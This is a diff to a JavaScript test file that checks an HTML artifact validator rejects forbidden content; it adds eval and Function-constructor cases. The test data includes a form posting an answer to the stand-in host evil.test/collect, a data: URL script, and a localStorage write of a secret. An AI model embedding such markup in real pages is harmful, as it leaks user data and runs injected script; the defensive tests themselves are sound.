@@ -89,6 +89,8 @@ describe("activity artifact contracts", () => {
     ["relative srcset candidate", "<img srcset='asset.png 1x'>", "external or executable URL references are forbidden"],
     ["style import", "<style>@import './theme.css';</style>", "CSS URL references are forbidden"],
     ["style URL", "<style>body { background: url(asset.png); }</style>", "CSS URL references are forbidden"],
+    ["eval", "<script>eval('reportComplete()')</script>", "eval is forbidden"],
+    ["Function constructor", "<script>new Function('reportComplete()')()</script>", "Function constructor is forbidden"],
     ["data script URL", "<script src='data:text/javascript,alert(1)'></script>", "external or executable URL references are forbidden"],
     ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
     ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
